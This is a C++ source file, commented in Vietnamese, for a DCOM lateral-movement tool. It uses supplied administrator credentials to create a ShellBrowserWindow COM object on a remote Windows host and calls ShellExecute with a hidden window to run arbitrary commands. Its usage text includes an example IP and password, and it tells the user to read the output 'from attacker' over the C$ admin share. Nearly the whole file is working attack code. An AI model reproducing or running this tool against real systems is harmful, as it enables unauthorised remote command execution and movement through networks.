// =============================================================================
// METHOD 1 FIX v2: Shell DCOM – exe và args phải tách riêng
// =============================================================================
// Lỗi trong ảnh: Windows cannot find 'cmd /c whoami > c:\temp\dcom.txt'
// Nguyên nhân: ShellExecute nhận "File" parameter là TÊN FILE thực thi.
// Nếu truyền "cmd /c whoami > file.txt" vào File → Windows tìm file có tên
// đó theo nghĩa đen → không tìm được → dialog lỗi.
//
// FIX: Luôn truyền exe và args TÁCH RIÊNG qua 2 tham số argv.
//
// Ngoài ra: ShellExecute không hỗ trợ shell redirection (>) trực tiếp
// vì nó không chạy qua cmd shell. Phải wrap trong cmd.exe:
//   exe  = "cmd.exe"
//   args = "/c whoami > c:\temp\dcom.txt"
//
// Usage: com_remote_dcom.exe <ip> <user> <pass> <exe> <args>
//   ví dụ: com_remote_dcom.exe 192.168.17.36 Administrator P@ssw0rd123
//           cmd.exe "/c whoami > c:\temp\dcom.txt"
// =============================================================================
// Compile: cl method1_shell_v2.cpp /link ole32.lib oleaut32.lib
// =============================================================================

#define _WIN32_DCOM
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <comdef.h>
#include <shldisp.h>
#include <shlobj.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

void PrintErr(const wchar_t* msg, HRESULT hr) {
    _com_error e(hr);
    wprintf(L"[-] %s: 0x%08X (%s)\n", msg, hr, e.ErrorMessage());
}

void SetProxy(IUnknown* p, SEC_WINNT_AUTH_IDENTITY_W* auth) {
    if (p) CoSetProxyBlanket(p,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        auth, EOAC_NONE);
}

IDispatch* GetProp(IDispatch* p, const wchar_t* name, SEC_WINNT_AUTH_IDENTITY_W* auth) {
    DISPID id; BSTR b = SysAllocString(name);
    HRESULT hr = p->GetIDsOfNames(IID_NULL, &b, 1, LOCALE_USER_DEFAULT, &id);
    SysFreeString(b);
    if (FAILED(hr)) { PrintErr(name, hr); return NULL; }
    DISPPARAMS dp = {}; VARIANT v; VariantInit(&v);
    hr = p->Invoke(id, IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_PROPERTYGET, &dp, &v, NULL, NULL);
    if (FAILED(hr) || v.vt != VT_DISPATCH || !v.pdispVal) {
        if (FAILED(hr)) PrintErr(name, hr);
        VariantClear(&v); return NULL;
    }
    SetProxy(v.pdispVal, auth);
    return v.pdispVal;
}

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 5) {
        wprintf(L"Usage: com_remote_dcom <ip> <user> <pass> <exe> [args]\n");
        wprintf(L"\n");
        wprintf(L"  QUAN TRONG: exe va args phai tach rieng!\n");
        wprintf(L"  SAI:  com_remote_dcom ... \"cmd /c whoami > c:\\temp\\out.txt\"\n");
        wprintf(L"  DUNG: com_remote_dcom ... cmd.exe \"/c whoami > c:\\temp\\out.txt\"\n");
        wprintf(L"\n");
        wprintf(L"  Vi du:\n");
        wprintf(L"    com_remote_dcom 192.168.17.36 Administrator P@ssw0rd123 \\\n");
        wprintf(L"      cmd.exe \"/c whoami > c:\\temp\\dcom.txt\"\n");
        return 1;
    }

    std::wstring ip = argv[1];
    std::wstring user = argv[2];
    std::wstring pass = argv[3];
    std::wstring exe = argv[4];                          // VD: "cmd.exe"
    std::wstring args = (argc >= 6) ? argv[5] : L"";     // VD: "/c whoami > c:\temp\out.txt"

    // Validate: cảnh báo nếu exe chứa khoảng trắng (dấu hiệu truyền nhầm)
    if (exe.find(L' ') != std::wstring::npos) {
        wprintf(L"[!] WARNING: <exe> chua khoang trang: \"%s\"\n", exe.c_str());
        wprintf(L"[!] ShellExecute se tim file co ten do theo nghia den!\n");
        wprintf(L"[!] Hay tach exe va args thanh 2 tham so rieng biet.\n");
        wprintf(L"[!] Tiep tuc sau 3 giay...\n");
        Sleep(3000);
    }

    HRESULT hr;
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) { PrintErr(L"CoInitializeEx", hr); return 1; }
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IDENTIFY,
        NULL, EOAC_NONE, NULL);
    if (FAILED(hr) && hr != RPC_E_TOO_LATE)
        PrintErr(L"CoInitializeSecurity (non-fatal)", hr);

    SEC_WINNT_AUTH_IDENTITY_W auth = {};
    auth.User = (USHORT*)user.c_str(); auth.UserLength = (ULONG)user.size();
    auth.Password = (USHORT*)pass.c_str(); auth.PasswordLength = (ULONG)pass.size();
    auth.Domain = (USHORT*)L""; auth.DomainLength = 0;
    auth.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    COAUTHIDENTITY coAuth = {};
    coAuth.User = (USHORT*)user.c_str(); coAuth.UserLength = (ULONG)user.size();
    coAuth.Password = (USHORT*)pass.c_str(); coAuth.PasswordLength = (ULONG)pass.size();
    coAuth.Domain = (USHORT*)L""; coAuth.DomainLength = 0;
    coAuth.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    COAUTHINFO coAuthInfo = {};
    coAuthInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    coAuthInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    coAuthInfo.pwszServerPrincName = NULL;
    coAuthInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    coAuthInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    coAuthInfo.pAuthIdentityData = &coAuth;
    coAuthInfo.dwCapabilities = EOAC_NONE;

    COSERVERINFO srv = {};
    srv.pwszName = (LPWSTR)ip.c_str();
    srv.pAuthInfo = &coAuthInfo;

    // ── Tạo ShellBrowserWindow trên target ───────────────────────────────────
    const CLSID CLSID_SBW = {
        0xC08AFD90,0xF2A1,0x11D1,{0x84,0x55,0x00,0xA0,0xC9,0x1F,0x38,0x80}
    };
    MULTI_QI mqi = { &IID_IDispatch, NULL, S_OK };
    hr = CoCreateInstanceEx(CLSID_SBW, NULL, CLSCTX_REMOTE_SERVER, &srv, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr)) {
        PrintErr(L"CoCreateInstanceEx(ShellBrowserWindow)", FAILED(hr) ? hr : mqi.hr);
        CoUninitialize(); return 1;
    }
    IDispatch* pBrowser = (IDispatch*)mqi.pItf;
    SetProxy(pBrowser, &auth);
    wprintf(L"[+] ShellBrowserWindow created on %s\n", ip.c_str());

    IDispatch* pDoc = GetProp(pBrowser, L"Document", &auth);
    if (!pDoc) { pBrowser->Release(); CoUninitialize(); return 1; }
    wprintf(L"[+] Got .Document\n");

    IDispatch* pApp = GetProp(pDoc, L"Application", &auth);
    if (!pApp) { pDoc->Release(); pBrowser->Release(); CoUninitialize(); return 1; }
    wprintf(L"[+] Got .Application\n");

    // ── Gọi ShellExecute(File, Args, Dir, Verb, ShowCmd) ─────────────────────
    //
    // File  = exe  = "cmd.exe"          ← chỉ tên file thực thi
    // Args  = args = "/c whoami > ..."  ← tham số truyền cho exe đó
    // Dir   = thư mục làm việc
    // Verb  = "open"
    // Show  = SW_HIDE (0)
    //
    DISPID dispSE;
    BSTR bSE = SysAllocString(L"ShellExecute");
    hr = pApp->GetIDsOfNames(IID_NULL, &bSE, 1, LOCALE_USER_DEFAULT, &dispSE);
    SysFreeString(bSE);

    if (FAILED(hr)) {
        PrintErr(L"GetIDsOfNames(ShellExecute)", hr);
    }
    else {
        VARIANT a[5];
        for (int i = 0; i < 5; i++) VariantInit(&a[i]);

        // Thứ tự ngược trong DISPPARAMS:
        a[4].vt = VT_BSTR; a[4].bstrVal = SysAllocString(exe.c_str());   // File (exe)
        a[3].vt = VT_BSTR; a[3].bstrVal = SysAllocString(args.c_str());  // Args
        a[2].vt = VT_BSTR; a[2].bstrVal = SysAllocString(L"C:\\Windows\\System32");
        a[1].vt = VT_BSTR; a[1].bstrVal = SysAllocString(L"open");
        a[0].vt = VT_INT;  a[0].intVal = SW_HIDE;

        DISPPARAMS dp = { a, NULL, 5, 0 };
        VARIANT vRes; VariantInit(&vRes);
        EXCEPINFO ex = {};
        hr = pApp->Invoke(dispSE, IID_NULL, LOCALE_USER_DEFAULT,
            DISPATCH_METHOD, &dp, &vRes, &ex, NULL);
        for (int i = 0; i < 5; i++) VariantClear(&a[i]);
        VariantClear(&vRes);

        if (SUCCEEDED(hr)) {
            wprintf(L"[+] SUCCESS!\n");
            wprintf(L"    Exe : %s\n", exe.c_str());
            wprintf(L"    Args: %s\n", args.c_str());
            wprintf(L"\n[*] Ket qua: doc file output tu attacker:\n");
            wprintf(L"    type \\\\%s\\C$\\temp\\dcom.txt\n", ip.c_str());
        }
        else {
            PrintErr(L"ShellExecute.Invoke", hr);
        }
    }

    pApp->Release(); pDoc->Release(); pBrowser->Release();
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : 1;
}